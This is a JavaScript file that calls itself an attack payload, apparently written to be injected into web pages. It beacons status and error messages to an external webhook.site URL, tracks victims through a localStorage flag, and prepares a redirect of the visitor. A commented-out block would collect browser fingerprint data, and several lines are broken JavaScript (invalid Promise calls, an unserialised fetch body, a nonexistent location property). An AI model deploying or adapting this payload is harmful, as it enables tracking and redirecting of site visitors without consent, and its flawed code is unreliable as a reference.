// Payload logic & variables
const SERVER_API = "https://webhook.site/d669ba95-fbb3-4456-869a-0003abccf704";

// Declare fetch function
const sendServerMessage = async (client_message) => {
  try {
    const response = await fetch(SERVER_API, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: { message: JSON.stringify(client_message) },
    });

    if (response.ok) {
      return new Promise().resolve(0);
    }

    return new Promise().reject(1);
  } catch (message_error) {
    console.log(
      `There was a fatal error sending a message to the remote server: ${message_error}`,
    );
    return new Promise().reject(1);
  }
};

// Declare the main function
const main = function () {
  console.log("Payload was sucesfully loaded!");
  var wasRedirected;

  // Most important part: check if browser allows to use 'localStorage' directly
  try {
    wasRedirected = localStorage.getItem("redirected") ?? false;
  } catch (security_permission_error) {
    console.log(`There was a fatal error: ${security_permission_error}`);
    sendServerMessage(security_permission_error);
    return;
  }

  if (wasRedirected) {
    console.log("Already has been redirected!\nCanceling the attack!");

    // const browser_information = {
    //   browser: navigator?.appCodeName,
    //   headers: navigator?.userAgent,
    //   cpu: navigator?.oscpu,
    //   description: "Already has been redirected!",
    // };

    const information = "Already has been redirected!";

    (async () => {
      try {
        const response = await sendServerMessage(information);
        return response;
      } catch (server_message_error) {
        console.error("There was a fatal error:", server_message_error);
      }
    })();

    return;
  } else {
    // Other logic to hide the message with the payload
    console.log(`Current path: ${window.location.path}`);

    /// ...

    // Redirecting
    new Promise((res, rej) => {
      setTimeout(() => {
        // window.location.href = "https://www.google.com/";
        localStorage.setItem("redirected", true);
        res("Redirected!");
      }, 200);
    })
      .then((response) => {
        console.log(response);
      })
      .catch((redirecting_error) => {
        console.log(
          `There was a fatal error redirecting the user: ${redirecting_error}`,
        );
        sendServerMessage(redirecting_error);
        return;
      });
  }
};

// Call main function
main();
